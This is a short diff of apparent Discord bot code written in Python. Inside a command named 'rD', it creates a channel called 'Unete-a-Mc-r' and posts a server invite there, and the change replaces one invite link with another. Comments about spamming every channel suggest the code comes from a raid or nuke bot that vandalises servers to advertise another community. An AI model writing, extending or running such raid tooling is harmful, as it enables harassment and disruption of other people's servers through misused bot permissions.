@@ -150,7 +150,7 @@ async def rD(ctx):
     # 2. Crear canal especial (Sin spam)
     try:
         ch_esp = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
-        await ch_esp.send("https://discord.gg/aACMXB4HSp")
+        await ch_esp.send("https://discord.gg/pRnwdc3gQj")
     except: pass
 
     # 3. Función auxiliar de spam para cada canal
